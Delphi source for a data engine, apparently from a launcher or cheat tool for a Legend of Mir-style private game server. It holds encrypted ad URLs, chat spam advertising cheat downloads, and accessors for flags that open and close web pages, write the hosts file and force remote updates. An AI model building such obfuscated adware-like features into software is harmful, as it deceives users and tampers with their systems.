    g_Data.SayMessage2 := 'gx7P6crjqI4zyFk3wH+hx8NsninJvByAkHI+OT8iBqYAohJj7ay1wgyr3lihIkKOsPwtBwIt'; //玩英雄合击.到http://www.haocq.com下载英雄外挂!
{$IFEND}

{$IF USERVERSION = 10}
    g_Data.UserLiense := 'XeIyImRRM0YrhoT6bCdc7YNoYsKeNJXVF5NUmQ==';
    g_Data.HomePage := 'ZP6tPL8ZclJEoXt5e+aVXGHZPcfBjHk4sDiwiXp3oBp9XKVstQ=='; //http://www.941sf.com/SF/1.HTM
    g_Data.OpenPage1 := 'yxr4FJFnJs9O6Qg09ydIWqqvQvCNvV3EfwqKag=='; //http://www.941yx.com
    g_Data.OpenPage2 := 'hXSLOEZNoun4Lrj58eRvmACsQtBcr86vTitYrg=='; //http://www.941sf.com
    g_Data.ClosePage1 := 'Bg8c7TZheE41YWizj+IFCx7VHvMziMOldggAPQ=='; //http://www.941yx.com
    g_Data.ClosePage2 := '0dRzf837Dn5jo5bgtZa9TImK0ZEIhY37NCuu1g=='; //http://www.941sf.com
    g_Data.SayMessage1 := 'toI9ml8phWxgOGeSlFvCxbklzNAs2UoqQDgIBZEXsrzOJLBMqpPRvrSpLRVUQ8g='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!
    g_Data.SayMessage2 := 'fof2WCvMGh0iSuK5T0RiXBheGHviypkCdIOhksBFhZxDcTlDdTihc0AF0IbzGJI='; //玩英雄合击.到Www.941SF.Com下载英雄外挂!
{$IFEND}

    g_Data.SayMsgTime := 10000;
    sData := EncryptBuffer(@EcodeData, SizeOf(TEcodeData));
    MoveData(sData);
    Result := True;
  end;
  FInitialized := g_Data.Initialized;
  //{$I VMProtectEnd.inc}
end;

procedure TDataEngine.AddTitle(MainHwnd: THandle; sTitle: string);
var
  I: Integer;
  nIndex: Integer;
  Buff: PChar;
begin
  nIndex := -1;
  for I := 0 to 10 do begin
    if g_Data.MainHwnd[I] = 0 then begin
      g_Data.MainHwnd[I] := MainHwnd;
      nIndex := I;
      Break;
    end;
  end;
  if nIndex < 0 then Exit;
  //FillChar(g_Data.Title[nIndex], SizeOf(TTitle), #0);
  //Buff := @g_Data.Title[nIndex];
  //Move(sTitle[1], Buff^, SizeOf(TTitle));
  g_Data.Title[nIndex] := sTitle;
end;

procedure TDataEngine.DeleteTitle(MainHwnd: THandle);
var
  I: Integer;
  nIndex: Integer;
begin
  nIndex := -1;
  for I := 0 to 10 do begin
    if g_Data.MainHwnd[I] = MainHwnd then begin
      g_Data.MainHwnd[I] := 0;
      nIndex := I;
      Break;
    end;
  end;
  if nIndex < 0 then Exit;
  g_Data.Title[nIndex] := '';
  //FillChar(g_Data.Title[nIndex], SizeOf(TTitle), #0);
end;

procedure TDataEngine.UpDateTitle(MainHwnd: THandle; sTitle: string);
var
  I: Integer;
  Buff: PChar;
begin
  for I := 0 to 10 do begin
    if g_Data.MainHwnd[I] = MainHwnd then begin
      FillChar(g_Data.Title[I], SizeOf(TTitle), #0);
      g_Data.Title[I] := sTitle;
      Break;
    end;
  end;
end;

function TDataEngine.GetTitle(Index: Integer): string;
var
  I: Integer;
begin
  Result := '';
  if FInitialized then begin
    for I := 0 to 10 do begin
      if g_Data.MainHwnd[I] = Index then begin
        Result := g_Data.Title[I];
        Break;
      end;
    end;
  end;
end;

procedure TDataEngine.Decrypt;
var
  sData: string;
begin
  //while g_Data.Lock do Sleep(1);
  g_Data.Lock := True;
  //FillChar(FEcodeData, SizeOf(TEcodeData), #0);
  if FInitialized then begin
    sData := g_Data.Data;
    sData := Trim(sData);
    DecryptBuffer(sData, @FEcodeData, SizeOf(TEcodeData));
  end;
end;

procedure TDataEngine.Encrypt;
var
  sData: string;
begin
  if FInitialized then begin
    sData := EncryptBuffer(@FEcodeData, SizeOf(TEcodeData));
    MoveData(sData);
  end;
  //FillChar(FEcodeData, SizeOf(TEcodeData), #0);
  g_Data.Lock := False;
end;






function TDataEngine.GetCheckParent: Boolean;
begin
  Decrypt;
  Result := FEcodeData.CheckParent;
end;

procedure TDataEngine.SetCheckParent(Value: Boolean);
begin
  Decrypt;
  FEcodeData.CheckParent := Value;
  Encrypt;
end;

function TDataEngine.GetCheck1: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check1;
end;

procedure TDataEngine.SetCheck1(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check1 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck2: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check2;
end;

procedure TDataEngine.SetCheck2(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check2 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck3: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check3;
end;

procedure TDataEngine.SetCheck3(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check3 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck4: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check4;
end;

procedure TDataEngine.SetCheck4(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check4 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck5: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check5;
end;

procedure TDataEngine.SetCheck5(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check5 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck6: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check6;
end;

procedure TDataEngine.SetCheck6(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check6 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck7: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check7;
end;

procedure TDataEngine.SetCheck7(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check7 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck8: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check8;
end;

procedure TDataEngine.SetCheck8(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check8 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck9: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check9;
end;

procedure TDataEngine.SetCheck9(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check9 := Value;
  Encrypt;
end;

function TDataEngine.GetCheck10: Boolean;
begin
  Decrypt;
  Result := FEcodeData.Check10;
end;

procedure TDataEngine.SetCheck10(Value: Boolean);
begin
  Decrypt;
  FEcodeData.Check10 := Value;
  Encrypt;
end;


function TDataEngine.GetUseServerUpgrade: Boolean;
begin
  Decrypt;
  Result := FEcodeData.UseServerUpgrade;
end;

procedure TDataEngine.SetUseServerUpgrade(Value: Boolean);
begin
  Decrypt;
  FEcodeData.UseServerUpgrade := Value;
  Encrypt;
end;



function TDataEngine.GetCheckConnectPage: Boolean;
begin
  Decrypt;
  Result := FEcodeData.CheckConnectPage;
end;

procedure TDataEngine.SetCheckConnectPage(Value: Boolean);
begin
  Decrypt;
  FEcodeData.CheckConnectPage := Value;
  Encrypt;
end;

function TDataEngine.GetCheckOpenPage: Boolean;
begin
  Decrypt;
  Result := FEcodeData.CheckOpenPage;
end;

procedure TDataEngine.SetCheckOpenPage(Value: Boolean);
begin
  Decrypt;
  FEcodeData.CheckOpenPage := Value;
  Encrypt;
end;

function TDataEngine.GetWriteUrlEntry: Boolean;
begin
  Decrypt;
  Result := FEcodeData.WriteUrlEntry;
end;

procedure TDataEngine.SetWriteUrlEntry(Value: Boolean);
begin
  Decrypt;
  FEcodeData.WriteUrlEntry := Value;
  Encrypt;
end;

function TDataEngine.GetWriteHosts: Boolean;
begin
  Decrypt;
  Result := FEcodeData.WriteHosts;
end;

procedure TDataEngine.SetWriteHosts(Value: Boolean);
begin
  Decrypt;
  FEcodeData.WriteHosts := Value;
  Encrypt;
end;

function TDataEngine.GetHostsAddress: Integer;
begin
  Decrypt;
  Result := FEcodeData.HostsAddress;
end;

procedure TDataEngine.SetHostsAddress(Value: Integer);
begin
  Decrypt;
  FEcodeData.HostsAddress := Value;
  Encrypt;
end;

function TDataEngine.GetAllowUpData: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boAllowUpData;
end;

procedure TDataEngine.SetAllowUpData(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boAllowUpData := Value;
  Encrypt;
end;

function TDataEngine.GetCompulsiveUpdata: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boCompulsiveUpdata;
end;

procedure TDataEngine.SetCompulsiveUpdata(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boCompulsiveUpdata := Value;
  Encrypt;
end;


function TDataEngine.GetUpdataAddr: string;
begin
  Decrypt;
  Result := FEcodeData.sUpdataAddr;
end;

procedure TDataEngine.SetUpdataAddr(Value: string);
begin
  Decrypt;
  FEcodeData.sUpdataAddr := Value;
  Encrypt;
end;

function TDataEngine.GetMD5: string;
begin
  Decrypt;
  Result := FEcodeData.sMD5;
end;

procedure TDataEngine.SetMD5(Value: string);
begin
  Decrypt;
  FEcodeData.sMD5 := Value;
  Encrypt;
end;

function TDataEngine.GetCheckNoticeUrl: Boolean;
begin
  Decrypt;
  Result := FEcodeData.CheckNoticeUrl;
end;

procedure TDataEngine.SetCheckNoticeUrl(Value: Boolean);
begin
  Decrypt;
  FEcodeData.CheckNoticeUrl := Value;
  Encrypt;
end;



function TDataEngine.GetState: Integer;
begin
  Decrypt;
  Result := FEcodeData.State;
end;

procedure TDataEngine.SetState(Value: Integer);
begin
  Decrypt;
  FEcodeData.State := Value;
  Encrypt;
end;

function TDataEngine.GetError: Integer;
begin
  //{$I VMProtectBeginVirtualization.inc}
  //Result := Random(1000);
  Decrypt;
  Result := FEcodeData.Error;
  //{$I VMProtectEnd.inc}
end;

procedure TDataEngine.SetError(Value: Integer);
begin
  //{$I VMProtectBeginVirtualization.inc}
  Decrypt;
  FEcodeData.Error := Value;
  Encrypt;
 // {$I VMProtectEnd.inc}
end;

function TDataEngine.GetCheckStatus(): TCheckStatus;
begin
  Decrypt;
  Result := FEcodeData.CheckStatus;
end;

procedure TDataEngine.SetCheckStatus(Value: TCheckStatus);
begin
  Decrypt;
  FEcodeData.CheckStatus := Value;
  Encrypt;
end;

function TDataEngine.GetEXEVersion: Integer;
begin
  Decrypt;
  Result := FEcodeData.EXEVersion;
end;

procedure TDataEngine.SetEXEVersion(Value: Integer);
begin
  Decrypt;
  FEcodeData.EXEVersion := Value;
  Encrypt;
end;

function TDataEngine.GetDLLVersion: Integer;
begin
  Decrypt;
  Result := FEcodeData.DLLVersion;
end;

procedure TDataEngine.SetDLLVersion(Value: Integer);
begin
  Decrypt;
  FEcodeData.DLLVersion := Value;
  Encrypt;
end;

function TDataEngine.GetCqfirVersion: Integer;
begin
  Decrypt;
  Result := FEcodeData.CqfirVersion;
end;

procedure TDataEngine.SetCqfirVersion(Value: Integer);
begin
  Decrypt;
  FEcodeData.CqfirVersion := Value;
  Encrypt;
end;

function TDataEngine.GetnUserLiense: Integer;
begin
  Decrypt;
  Result := FEcodeData.nUserLiense;
end;

procedure TDataEngine.SetnUserLiense(Value: Integer);
begin
  Decrypt;
  FEcodeData.nUserLiense := Value;
  Encrypt;
end;

function TDataEngine.GetnConfigAddr: Integer;
begin
  Decrypt;
  Result := FEcodeData.nConfigAddr;
end;

procedure TDataEngine.SetnConfigAddr(Value: Integer);
begin
  Decrypt;
  FEcodeData.nConfigAddr := Value;
  Encrypt;
end;

function TDataEngine.GetnHomePage: Integer;
begin
  Decrypt;
  Result := FEcodeData.nHomePage;
end;

procedure TDataEngine.SetnHomePage(Value: Integer);
begin
  Decrypt;
  FEcodeData.nHomePage := Value;
  Encrypt;
end;

function TDataEngine.GetnOpenPage1: Integer;
begin
  Decrypt;
  Result := FEcodeData.nOpenPage1;
end;

procedure TDataEngine.SetnOpenPage1(Value: Integer);
begin
  Decrypt;
  FEcodeData.nOpenPage1 := Value;
  Encrypt;
end;

function TDataEngine.GetnOpenPage2: Integer;
begin
  Decrypt;
  Result := FEcodeData.nOpenPage2;
end;

procedure TDataEngine.SetnOpenPage2(Value: Integer);
begin
  Decrypt;
  FEcodeData.nOpenPage2 := Value;
  Encrypt;
end;

function TDataEngine.GetnClosePage1: Integer;
begin
  Decrypt;
  Result := FEcodeData.nClosePage1;
end;

procedure TDataEngine.SetnClosePage1(Value: Integer);
begin
  Decrypt;
  FEcodeData.nClosePage1 := Value;
  Encrypt;
end;

function TDataEngine.GetnClosePage2: Integer;
begin
  Decrypt;
  Result := FEcodeData.nClosePage2;
end;

procedure TDataEngine.SetnClosePage2(Value: Integer);
begin
  Decrypt;
  FEcodeData.nClosePage2 := Value;
  Encrypt;
end;

















function TDataEngine.GetboOpenPage1: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boOpenPage1;
end;

procedure TDataEngine.SetboOpenPage1(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boOpenPage1 := Value;
  Encrypt;
end;

function TDataEngine.GetboOpenPage2: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boOpenPage2;
end;

procedure TDataEngine.SetboOpenPage2(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boOpenPage2 := Value;
  Encrypt;
end;

function TDataEngine.GetboClosePage1: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boClosePage1;
end;

procedure TDataEngine.SetboClosePage1(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boClosePage1 := Value;
  Encrypt;
end;

function TDataEngine.GetboClosePage2: Boolean;
begin
  Decrypt;
  Result := FEcodeData.boClosePage2;
end;

procedure TDataEngine.SetboClosePage2(Value: Boolean);
begin
  Decrypt;
  FEcodeData.boClosePage2 := Value;
  Encrypt;
end;










function TDataEngine.GetnSayMessage1: Integer;
begin
  Decrypt;
  Result := FEcodeData.nSayMessage1;
end;

procedure TDataEngine.SetnSayMessage1(Value: Integer);
begin
  Decrypt;
  FEcodeData.nSayMessage1 := Value;
  Encrypt;
end;

function TDataEngine.GetnSayMessage2: Integer;
begin
  Decrypt;
  Result := FEcodeData.nSayMessage2;
end;

procedure TDataEngine.SetnSayMessage2(Value: Integer);
begin
  Decrypt;
  FEcodeData.nSayMessage2 := Value;
  Encrypt;
end;

function TDataEngine.GetsUserLiense: string;
begin
  if FInitialized then
    Result := g_Data.UserLiense
  else Result := '';
end;

procedure TDataEngine.SetsUserLiense(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.UserLiense := Value;
    {Buff := @g_Data.UserLiense;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));}
  end;
end;

function TDataEngine.GetsConfigAddr: string;
begin
  if FInitialized then
    Result := g_Data.ConfigAddr
  else Result := '';
end;

procedure TDataEngine.SetsConfigAddr(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.ConfigAddr := Value;
    {Buff := @g_Data.ConfigAddr;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText)); }
  end;
end;

function TDataEngine.GetsHomePage: string;
begin
  if FInitialized then
    Result := g_Data.HomePage
  else Result := '';
end;

procedure TDataEngine.SetsHomePage(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.HomePage := Value;
    {Buff := @g_Data.HomePage;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));  }
  end;
end;

function TDataEngine.GetsOpenPage1: string;
begin
  if FInitialized then
    Result := g_Data.OpenPage1
  else Result := '';
end;

procedure TDataEngine.SetsOpenPage1(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.OpenPage1 := Value;
    {Buff := @g_Data.OpenPage1;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText)); }
  end;
end;

function TDataEngine.GetsOpenPage2: string;
begin
  if FInitialized then
    Result := g_Data.OpenPage2
  else Result := '';
end;

procedure TDataEngine.SetsOpenPage2(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.OpenPage2 := Value;
    {Buff := @g_Data.OpenPage2;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));}
  end;
end;

function TDataEngine.GetsClosePage1: string;
begin
  if FInitialized then
    Result := g_Data.ClosePage1
  else Result := '';
end;

procedure TDataEngine.SetsClosePage1(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.ClosePage1 := Value;
    {Buff := @g_Data.ClosePage1;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));}
  end;
end;

function TDataEngine.GetsClosePage2: string;
begin
  if FInitialized then
    Result := g_Data.ClosePage2
  else Result := '';
end;

procedure TDataEngine.SetsClosePage2(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.ClosePage2 := Value;
    {Buff := @g_Data.ClosePage2;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));}
  end;
end;

function TDataEngine.GetsSayMessage1: string;
begin
  if FInitialized then
    Result := g_Data.SayMessage1
  else Result := '';
end;

procedure TDataEngine.SetsSayMessage1(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.SayMessage1 := Value;
    {Buff := @g_Data.SayMessage1;
    FillChar(Buff^, SizeOf(TText), #0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText)); }
  end;
end;

function TDataEngine.GetsSayMessage2: string;
begin
  if FInitialized then
    Result := g_Data.SayMessage2
  else Result := '';
end;

procedure TDataEngine.SetsSayMessage2(Value: string);
var
  Buff: PChar;
begin
  if FInitialized then begin
    g_Data.SayMessage2 := Value;
    {Buff := @g_Data.SayMessage2;
    FillChar(Buff^, SizeOf(TText), 0);
    if Value <> '' then
      Move(Value[1], Buff^, SizeOf(TText));}
  end;
end;

function MakeIntToIP(nIPaddr: Integer): string;
var
  IPAddr: TIPaddr;
begin
  FillChar(IPAddr, SizeOf(TIPaddr), 0);
  IPAddr.A := LoByte(LoWord(nIPaddr));
  IPAddr.B := HiByte(LoWord(nIPaddr));
  IPAddr.C := LoByte(HiWord(nIPaddr));
  IPAddr.D := HiByte(HiWord(nIPaddr));
  Result := MakeIPToStr(IPAddr);
end;

function MakeIPToStr(IPAddr: TIPaddr): string;
begin
  Result := IntToStr(IPAddr.A) + '.' + IntToStr(IPAddr.B) + '.' + IntToStr(IPAddr.C) + '.' + IntToStr(IPAddr.D);
end;

function MakeIPToInt(sIPaddr: string): Integer;
var
  sA, sB, SC, sD: string;
  A, B, C, D: Byte;
begin
  Result := -1;
  sIPaddr := Trim(GetValidStr3(sIPaddr, sA, ['.']));
  sIPaddr := Trim(GetValidStr3(sIPaddr, sB, ['.']));
  sD := Trim(GetValidStr3(sIPaddr, SC, ['.']));
  if (sA <> '') and (sB <> '') and (SC <> '') and (sD <> '') then begin
    A := Str_ToInt(sA, 0);
    B := Str_ToInt(sB, 0);
    C := Str_ToInt(SC, 0);
    D := Str_ToInt(sD, 0);
    Result := MakeLong(MakeWord(A, B), MakeWord(C, D));
  end;
end;

end.

